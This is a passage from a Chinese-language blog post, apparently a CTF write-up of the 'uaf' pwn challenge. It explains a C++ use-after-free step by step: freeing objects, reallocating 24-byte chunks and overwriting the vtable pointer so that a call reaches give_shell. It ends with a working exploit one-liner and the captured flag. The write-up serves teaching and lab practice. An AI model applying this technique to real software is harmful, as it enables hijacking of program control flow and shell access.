class="keyword">char</span>[len];</span><br><span class="line">                        read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                        <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                        <span class="keyword">delete</span> m;</span><br><span class="line">                        <span class="keyword">delete</span> w;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>可以看出程序给了我们3个选项</p>
<ul>
<li>use 使用指针指向的函数</li>
<li>after 分配一段地址空间，我们可以用其将已经被free的内存，重新allocate</li>
<li>free 将指针指向的内存释放</li>
</ul>
<p>组合起来就是UAF。</p>
<h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ul>
<li>调试找到虚表中give_shell函数地址。</li>
<li>free后再allocate，得到一个可控的地址空间.</li>
<li>为了在use，即m-&gt;introduce()时，将本来执行的introduce函数变成执行give_shell函数，<strong>在allocate的同时，改写虚表指针</strong>。</li>
<li>劫持控制流，执行give_shell</li>
</ul>
<h2 id="漏洞调试和利用"><a href="#漏洞调试和利用" class="headerlink" title="漏洞调试和利用"></a>漏洞调试和利用</h2><h3 id="找到Man的构造函数，从而找到虚函数表"><a href="#找到Man的构造函数，从而找到虚函数表" class="headerlink" title="找到Man的构造函数，从而找到虚函数表"></a>找到Man的构造函数，从而找到虚函数表</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-073918.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-073812.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013807.jpg" alt=""></p>
<h3 id="覆盖虚表指针"><a href="#覆盖虚表指针" class="headerlink" title="覆盖虚表指针"></a>覆盖虚表指针</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-074305.png" alt=""></p>
<ul>
<li><strong>give_shell</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-074336.png" alt=""></li>
<li><strong>Man::introduce</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-074402.png" alt=""></li>
<li><strong>call introduce</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-082915.png" alt=""><br>可以看出在执行m-&gt;introduce()的时候，调用call [vptr+8]。<br>为了执行give_shell，我们覆盖虚表指针，让它前移8个字节，这样call [vptr+8]的时候就调用give_shell了。</li>
<li><strong>allocate</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-075633.png" alt=""><br>从上图可以看出，原本Man对象分配的堆空间是0x18，即24字节，所以我们在再次分配的时候，也要分配24字节，保证自己拿到的是原先被free掉的地址空间。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Human* m = new Man(&quot;Jack&quot;, 25);</span><br><span class="line">Human* w = new Woman(&quot;Jill&quot;, 21);</span><br><span class="line">...</span><br><span class="line">delete m;</span><br><span class="line">delete w;</span><br></pre></td></tr></table></figure>
<p><strong>因为先free m再free w，所以为了再次拿到m所指向的空间，我们需要分配两次，第一次得到w所指向的空间，第二次才再次得到m所指向的空间</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">len = atoi(argv[1]);</span><br><span class="line">data = new char[len];</span><br><span class="line">read(open(argv[2], O_RDONLY), data, len);</span><br></pre></td></tr></table></figure>
<p>在此题中，是通过从文件中读出内容覆盖原先的内容的，等同于之前写的<code>strcpy(p-&gt;name,data)</code>，读取的长度是命令行的argv[1]，打开的文件是argv[2]</p>
<p>0x401570-0x8=0x401568-&gt;\x68\x15\x40\x00\x00\x00\x00\x00</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-082012.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;\x68\x15\x40\x00\x00\x00\x00\x00&apos;&quot; &gt; /tmp/exp.txt</span><br><span class="line">./uaf 24 /tmp/exp.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">yay_f1ag_aft3r_pwning</span><br></pre></td></tr></table></figure></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li>c++类实例在内存中的分配<br><a href="http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html" target="_blank" rel="noopener">http://www.cnblogs.com/bizhu/archive/2012/09/25/2701691.html</a></li>
<li>ichunqiu ctf pwn<br><a href="https://www.ichunqiu.com/qad/course/57507" target="_blank" rel="noopener">https://www.ichunqiu.com/qad/course/57507</a></li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">sakura</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">96</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">44</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sakura</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
